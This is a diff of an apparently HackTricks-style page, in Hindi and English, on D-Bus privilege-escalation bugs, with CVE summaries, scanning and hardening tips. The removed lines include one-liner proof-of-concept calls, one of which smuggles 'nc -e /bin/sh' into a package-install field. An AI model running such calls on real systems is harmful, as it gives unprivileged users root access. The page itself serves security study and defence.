+* Python-only script जो systemd units में *writable* paths और overly-permissive D-Bus policy files (जैसे `send_destination="*"`) खोजता है।
+* Quick usage:
 ```bash
-python3 uptux.py -n          # सभी जांचें चलाएं लेकिन लॉग फ़ाइल न लिखें
-python3 uptux.py -d          # विस्तृत डिबग आउटपुट सक्षम करें
+python3 uptux.py -n          # run all checks but don’t write a log file
+python3 uptux.py -d          # enable verbose debug output
 ```
-* D-Bus मॉड्यूल नीचे दिए गए निर्देशिकाओं की खोज करता है और किसी भी सेवा को उजागर करता है जिसे एक सामान्य उपयोगकर्ता द्वारा धोखा दिया या हाईजैक किया जा सकता है:
-* `/etc/dbus-1/system.d/` और `/usr/share/dbus-1/system.d/`
-* `/etc/dbus-1/system-local.d/` (विक्रेता ओवरराइड)
+* D-Bus module नीचे दी गई directories search करता है और किसी भी service को highlight करता है जिसे normal user spoof या hijack कर सकता है:
+* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
+* `/etc/dbus-1/system-local.d/` (vendor overrides)
 
 ---
 
 ## Notable D-Bus Privilege-Escalation Bugs (2024-2025)
 
-हाल ही में प्रकाशित CVEs पर नज़र रखना कस्टम कोड में समान असुरक्षित पैटर्न को पहचानने में मदद करता है। निम्नलिखित उच्च-प्रभाव वाले स्थानीय EoP मुद्दे सभी **सिस्टम बस** पर प्रमाणीकरण/अधिकार की कमी से उत्पन्न होते हैं:
+हाल ही में published CVEs पर नज़र रखना custom code में similar insecure patterns पहचानने में मदद करता है। दो अच्छे recent examples हैं:
 
-| वर्ष | CVE | घटक | मूल कारण | One-Liner PoC |
-|------|-----|-----------|------------|---------------|
-| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID डेमॉन) | `logid` सिस्टम सेवा एक अनियंत्रित `org.freedesktop.Logiopsd` इंटरफेस को उजागर करती है जो *किसी भी* उपयोगकर्ता को डिवाइस प्रोफाइल बदलने और मैक्रो स्ट्रिंग्स के माध्यम से मनमाने शेल कमांड इंजेक्ट करने की अनुमति देती है। | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
-| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | एक रूट-चलने वाला प्रॉक्सी पुराने बस नामों को बैकएंड सेवाओं की ओर अग्रेषित करता है **बिना कॉलर UID/Polkit संदर्भ को अग्रेषित किए**, इसलिए हर अग्रेषित अनुरोध UID 0 के रूप में माना जाता है। | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
-| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | सार्वजनिक `Dispatch` विधि में कोई ACLs नहीं है → हमलावर *पैकेज-मैनेजर* कार्यकर्ता को मनमाने RPMs स्थापित करने का आदेश दे सकता है। | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
+| Year | CVE | Component | Root Cause | Offensive lesson |
+|------|-----|-----------|------------|------------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root-running service ने एक D-Bus interface expose किया जिसे unprivileged users reconfigure कर सकते थे, जिसमें attacker-controlled macro behavior load करना भी शामिल था। | अगर कोई daemon system bus पर **device/profile/config management** expose करता है, तो writable configuration और macro features को सिर्फ "settings" नहीं, बल्कि code-execution primitives मानें। |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root-running compatibility proxy ने original caller के security context को preserve किए बिना requests backend services तक forward कीं, इसलिए backends ने proxy को UID 0 के रूप में trust किया। | **proxy / bridge / compatibility** D-Bus services को एक अलग bug class मानें: अगर वे privileged calls relay करती हैं, तो verify करें कि caller UID/Polkit context backend तक कैसे पहुंचता है। |
 
-ध्यान देने योग्य पैटर्न:
-1. सेवा **सिस्टम बस पर रूट के रूप में चलती है**।
-2. कोई PolicyKit जांच नहीं है (या इसे एक प्रॉक्सी द्वारा बायपास किया गया है)।
-3. विधि अंततः `system()`/पैकेज स्थापना/डिवाइस पुनः कॉन्फ़िगरेशन की ओर ले जाती है → कोड निष्पादन।
+ध्यान देने योग्य patterns:
+1. Service **as root on the system bus** चलती है।
+2. या तो **no authorization check** होता है, या check **गलत subject** के खिलाफ किया जाता है।
+3. Reachable method आखिरकार system state बदलती है: package install, user/group changes, bootloader config, device profile updates, file writes, या direct command execution।
 
-`dbusmap --enable-probes` या मैनुअल `busctl call` का उपयोग करें यह पुष्टि करने के लिए कि क्या एक पैच उचित `polkit_authority_check_authorization()` लॉजिक को बैक-पोर्ट करता है।
+`dbusmap --enable-probes` या manual `busctl call` का उपयोग करके confirm करें कि कोई method reachable है या नहीं, फिर service की policy XML और Polkit actions inspect करें ताकि यह समझ सकें कि **किस subject** को वास्तव में authorize किया जा रहा है।
 
 ---
 
 ## Hardening & Detection Quick-Wins
 
-* विश्व-लिखने योग्य या *send/receive*-खुले नीतियों की खोज करें:
+* World-writable या *send/receive*-open policies खोजें:
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* खतरनाक विधियों के लिए Polkit की आवश्यकता करें – यहां तक कि *रूट* प्रॉक्सी को `polkit_authority_check_authorization_sync()` को अपने स्वयं के PID के बजाय *कॉलर* PID को पास करना चाहिए।
-* लंबे समय तक चलने वाले सहायक में विशेषाधिकार छोड़ें (बस से कनेक्ट करने के बाद namespaces को स्विच करने के लिए `sd_pid_get_owner_uid()` का उपयोग करें)।
-* यदि आप एक सेवा को हटा नहीं सकते हैं, तो कम से कम इसे एक समर्पित Unix समूह तक *स्कोप* करें और इसकी XML नीति में पहुंच को प्रतिबंधित करें।
-* ब्लू-टीम: `busctl capture --output=/var/log/dbus_$(date +%F).pcap` के साथ सिस्टम बस की स्थायी कैप्चर सक्षम करें और विसंगति पहचान के लिए Wireshark में आयात करें।
+* Dangerous methods के लिए Polkit required रखें – यहां तक कि *root* proxies को भी अपना PID नहीं, बल्कि *caller* PID `polkit_authority_check_authorization_sync()` को pass करना चाहिए।
+* Long-running helpers में privileges drop करें (bus से connect करने के बाद namespaces switch करने के लिए `sd_pid_get_owner_uid()` use करें)।
+* अगर किसी service को remove नहीं कर सकते, तो कम से कम उसे dedicated Unix group तक *scope* करें और उसकी XML policy में access restrict करें।
+* Blue-team: system bus को `busctl capture > /var/log/dbus_$(date +%F).pcapng` से capture करें और anomaly detection के लिए उसे Wireshark में import करें।
 
 ---
 
 ## References
 
 - [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
 - [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
-
-
-- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
-
 {{#include ../../banners/hacktricks-training.md}}
